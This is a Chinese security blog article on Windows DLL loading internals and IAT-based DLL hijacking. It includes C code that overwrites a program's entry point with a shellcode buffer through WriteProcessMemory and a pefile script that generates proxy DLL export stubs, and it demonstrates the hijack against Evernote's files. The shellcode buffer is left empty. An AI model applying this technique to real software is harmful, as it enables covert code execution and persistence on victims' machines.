<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/yHYREirMrPQs8n89gtJxXg)

Loadlibrary
-----------

`Loadlibrary`的底层是`LoadLibraryEx`

```
HMODULE WINAPI LoadLibraryEx(  _In_       LPCTSTR lpFileName,  _Reserved_ HANDLE  hFile,  _In_       DWORD   dwFlags);
```

第三个参数：

1.  `DONT_RESOLVE_DLL_REFERENCES` : 这个标志用于告诉系统将 DLL 映射到调用进程的地址空间中，但是不调用 DllMain 并且不加载依赖 Dll（只映射自己本身）。
    
2.  `LOAD_LIBRARY_AS_DATAFILE` : 这个标志与`DONT_RESOLVE_DLL_REFERENCES`标志相类似，因为系统只是将 DLL 映射到进程的地址空间中，就像它是数据文件一样。系统并不花费额外的时间来准备执行文件中的任何代码。
    
3.  `LOAD_LIBRARY_SEARCH_USER_DIRS` : 搜索路径的使用使用`AddDllDirectory`和`SetDllDirectory`设置的路径（保护 Dll 自己和依赖 Dll）。
    
4.  `LOAD_LIBRARY_SEARCH_SYSTEM32` : 从 %windows%\system32 加载 Dll 和其依赖项。
    
5.  `LOAD_LIBRARY_SEARCH_APPLICATION_DIR` : 应用程序安装路径搜索 Dll 和其依赖项。
    
6.  `LOAD_WITH_ALTERED_SEARCH_PATH`: 按照如下目录搜索：
    
    ```
    1. 进程当前目录2. Windows的系统目录3. 16 位Windows的系统目录4. Windows目录5. path环境变量目录
    ```
    

默认环境下`LoadLibrary`按照以下目录搜索

```
1. 进程当前目录。2. SetDllDirectory设置的文件夹路径。3. Windows的系统目录。4. 16 位Windows的系统目录。5. Windows目录。6. path环境变量目录。
```

`SetDllDirectory`函数如下

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7flF2fnF7Rx9Z0ia9D8IS2u5DJtd7IOVpicNSTicDuiaXsuWN2mtLoicTwSv1u15bmHicCR9XKTYDN5CyQ/640?wx_fmt=png)

跟到`KernelBaseGetGlobalData`

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7flF2fnF7Rx9Z0ia9D8IS2uW4KbadYmcsAiaeXIxibRCedUECqcNEoYvbTCR3ibfK3x0KA9LwaIvkKmQ/640?wx_fmt=png)

跟到 0 环可以发现，在转换之后可以得到路径

```
0:003> dd KERNELBASE!KernelBaseGlobalData75b155a0  00000000 00000000 00160014 7f9a124075b155b0  00280026 7f9a1260 00000000 0000000075b155c0  00000000 00e60000 75b156c0 7fff000075b155d0  00c4b494 0000011a 00cc1914 0000012c75b155e0  00cb9f34 00000253 00cc2658 00cc5e2075b155f0  00000000 00e84380 0000000f ffffffff75b15600  ffffffff 00000000 00000000 0000000075b15610  020007d0 75950000 00000000 000000000:003> du 7f9a12407f9a1240  "C:\Windows"0:003> du 7f9a1260 7f9a1260  "C:\Windows\system32"
```

`LoadLibraryExW`函数原型

```
HMODULE __stdcall LoadLibraryExW(LPCWSTR lpLibFileName, HANDLE hFile, DWORD dwFlags){    SearchPath = BaseGetProcessDllPath(                       &dwFlags,                       (chFlags & LOAD_WITH_ALTERED_SEARCH_PATH) != 0 ? DllName.Buffer : 0,                       0,                       (int)&dwFlags);    ntStatus = LdrLoadDll(SearchPath, (PULONG)&lpLibFileName, &DllName, &hFile);}
```

首先通过`BaseGetProcessDllPath`获取路径，然后调用`LdrLoadDll`加载 dll

```
NTSTATUS __stdcall LdrLoadDll(PWSTR SearchPath, PULONG LoadFlags, PUNICODE_STRING DllName, PVOID *BaseAddress){  //...  if ( SearchPath )  {    result = RtlInitUnicodeStringEx(&DestinationString, SearchPath);    if ( result < 0 )      return result;    NewSearchPath = &DestinationString;  }  else  {    NewSearchPath = &LdrpDefaultPath;  }  //...  v7 = LdrpLoadDll(DllName, (int)NewSearchPath, v6, 1, 0, (int)&DllName);  //...  return v7;}
```

再调用`LdrpLoadDll`

```
int __stdcall LdrpLoadDll(PCUNICODE_STRING Source, int a2, int a3, char a4, int a5, int a6){    //...    if ( !LdrpInLdrInit )      RtlEnterCriticalSection(&LdrpLoaderLock);        //...    LdrpFindOrMapDll(*(PCUNICODE_STRING *)((char *)&v31 + 1), v29, a3, v27[0], (int)&v33, (int)&v31);    //...    if ( v21 & 0x1000000 )        v22 = LdrpCorProcessImports((void *)v21, v33);    else        v22 = LdrpProcessStaticImports(v33, v29);    //...    LdrpRunInitializeRoutines(0);    //...    if ( !LdrpInLdrInit )      RtlLeaveCriticalSection(&LdrpLoaderLock);}
```

通过分析函数，其流程如下

1.  加载锁`RtlEnterCriticalSection(&LdrpLoaderLock)`
    
2.  通过`LdrpFindOrMapDll`加载 dll
    
3.  处理导入表信息
    
4.  运行回调函数`LdrpRunInitializeRoutines`
    
5.  释放锁`RtlLeaveCriticalSection(&LdrpLoaderLock)`
    

在第 4 步运行`LdrpRunInitializeRoutines`其实就是调用`DllMain`，也就是说加载 dll 首先会加载锁，再调用`DllMain`

挖掘
--

针对非`LoadLibrary`而是从 IAT 表导入函数的程序，不能用导出函数的方法

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7flF2fnF7Rx9Z0ia9D8IS2uuN0tPQ0olHp1UzkbqNiaicnib02a3x3F9x7xZRAXiaQcdjh4BRhlrJFMwA/640?wx_fmt=png)

导入表调用在程序执行开头，那么可以在解析 PE 头的时候调用 `DLL­MAIN`

```
MODULEINFO moduleInfoe;SIZE_T bytesWritten; GetModuleInformation(GetCurrentProcess(), GetModuleHandle(NULL), &moduleInfoe,sizeof(moduleInfoe)); char EntryAddr[MAX_PATH] = { 0 };_itoa_s((int)moduleInfoe.EntryPoint, EntryAddr, 10);unsigned char shellcode[] = "";int shellcode_size = 1024;HANDLE currentProcess = GetCurrentProcess();WriteProcessMemory(currentProcess, moduleInfoe.EntryPoint, (LPCVOID)&shellcode, shellcode_size, &bytesWritten);
```

导入表函数格式

```
#pragma comment(linker, "/EXPORT:cef_string_list_append=cef_string_list_append,@1")EXTERN_C __declspec(naked) void __cdecl cef_string_list_append(void){}
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7flF2fnF7Rx9Z0ia9D8IS2uN1qwWaCXAL0dKaXSH1V4VZCyhLSc6UzxGh8hqoP6X6MnXlLS9ibxosQ/640?wx_fmt=png)

手动写导入太麻烦，借助 python 的`PEfile`库直接读取导入表中的函数

https://github.com/erocarrera/pefile

首先定位判断 dll 名称

```
pe = pefile.PE(module_name)    for importeddll in pe.DIRECTORY_ENTRY_IMPORT:        DllName = str(importeddll.dll,encoding = "utf-8")        if(DllName != target_dll):            continue
```

然后获取导入表的函数

```
for importedapi in importeddll.imports:            print(importedapi.name)            FunctionName = str(importedapi.name,encoding = "utf-8")
```

获取到函数之后按照格式输出

```
tamplate += """#pragma comment(linker, "/EXPORT:%s=%s,@%s")\n""" % (FunctionName,FunctionName,i)\tamplate += """EXTERN_C __declspec(naked) void __cdecl %s(void){}\n""" % (FunctionName)
```

以印象笔记下的文件为例，其用的方法是从 IAT 表中导入函数，直接运行会显示缺 dll

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7flF2fnF7Rx9Z0ia9D8IS2uAib3m9zNxficHcZcUlOicr768xlqicibofjXqbh7ibTWQ8oDLYSU5VwKwWTw/640?wx_fmt=png)

这里使用脚本获取所有的导出函数

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7flF2fnF7Rx9Z0ia9D8IS2urBLc2Ic7srKjBGHlxd3FTcEkulFqVkLchc3eVR3d2ichF0Zm6XicP2gA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7flF2fnF7Rx9Z0ia9D8IS2ubS9PkJYpdHG2CANkjic3bswG2fibV9QRktH0q6rAria3xMVdINrLT8hlw/640?wx_fmt=png)

得到`a1.c`的源文件，可以看到已经将导出函数声明到了源文件里面

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7flF2fnF7Rx9Z0ia9D8IS2u5UkjicMJJPGCrLLN5AmzJQnmVS7noMia3FrVGzoZF7Bk6UibJiaN99cCbQ/640?wx_fmt=png)

然后将 shellcode 填充到相应位置

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7flF2fnF7Rx9Z0ia9D8IS2unOtyVtHZodvQNCct9uQ9iblq193IicOWjlT65DDUd7qdwkMRU0ljLTCA/640?wx_fmt=png)

再使用 gcc 编译成 dll

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7flF2fnF7Rx9Z0ia9D8IS2uwAoYguVEaQeKbXLfHrKQ1QOflFnySNnukdBu8HlBTicXQ8O4dkboicqg/640?wx_fmt=png)

双击即可完成 IAT 类型的 dll 劫持

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7flF2fnF7Rx9Z0ia9D8IS2uXWBpe0fkdOuMMSw6HRibvQibmrkqCTbfRH5GykGBTaYn1UMeiaFjbdydA/640?wx_fmt=png)

加下方 wx，拉你一起进群学习

![](https://mmbiz.qpic.cn/mmbiz_jpg/ibZ6uZjjH3v4WZgYJeibL4XoXol2MibfTeNPUTuUmqkgMFFf3icptn2CEN5kJEOOPWMg7STl235fSLQMgQ8GuSmWSg/640?wx_fmt=jpeg)

往期推荐

[

什么？你还不会 webshell 免杀？（十）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247504063&idx=1&sn=6ef2b411606302749b0afd84cbe52478&chksm=ce676a03f910e31549e7879dd54e8d6ba0228d98daa9618a260777822fb8f7eadb000fc74a44&scene=21#wechat_redirect)

[

PPL 攻击详解



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247504039&idx=1&sn=f4235a5b16a9ec54990b9ca60e612c3a&chksm=ce676a1bf910e30d0fa66e47c56ff30c95d015c41c25e1ccd65f52ae6302c125d5731148c182&scene=21#wechat_redirect)

[

绕过 360 核晶抓取密码



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247504007&idx=1&sn=d05780700a2f285f9b6e2df58ea2ea57&chksm=ce676a3bf910e32d608babbcd14e62ef80c965c118b6b5fa0978f4346cceab39571d8b8a94ff&scene=21#wechat_redirect)

[

什么？你还不会 webshell 免杀？（十）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247503993&idx=1&sn=6777c400219f28f3ec2d10a10eb88cd5&chksm=ce676ac5f910e3d32301ee99d320f870d9e68635cd21a7ef8c4e8853fd9309232d2335227122&scene=21#wechat_redirect)

[

64 位下使用回调函数实现监控



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247503980&idx=1&sn=c62724ad4b3a98ed77402fae985ff94d&chksm=ce676ad0f910e3c6d09961a698175262647c2c2fbbf77f8f5ec4cd510160a137f6371d14f517&scene=21#wechat_redirect)

[

什么？你还不会 webshell 免杀？（九）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247503754&idx=1&sn=0a8c57ce7ce89d10c292e3bc5cc5f6ed&chksm=ce677536f910fc20a5076d93c12a520c43a1c1a8fa36e30ace053ee3dcd12db38cc3782b7875&scene=21#wechat_redirect)

[

一键击溃 360 全家桶 + 核晶



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247503750&idx=1&sn=61f8d9ca458674d44de0019aeb39a875&chksm=ce67753af910fc2cb20170a97e7b519082c5f51805d6b86cc39b1469217e4c3539d61a9ba3f9&scene=21#wechat_redirect)

[

域内持久化后门



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247503705&idx=1&sn=7a6039810c41637e376757f306ab6745&chksm=ce6775e5f910fcf3226422091a3858b8064fa353320e48c4a4998ed5b89f51febe82e992309d&scene=21#wechat_redirect)

  

![](https://mmbiz.qpic.cn/mmbiz_gif/ibZ6uZjjH3v7LQZwTb4qED3KvozKicnJd9ejpVoCntCRqf53IiaK2T3myzcUn5sswkUPfpQj1KHAALFcMFNYjfriaw/640?wx_fmt=gif)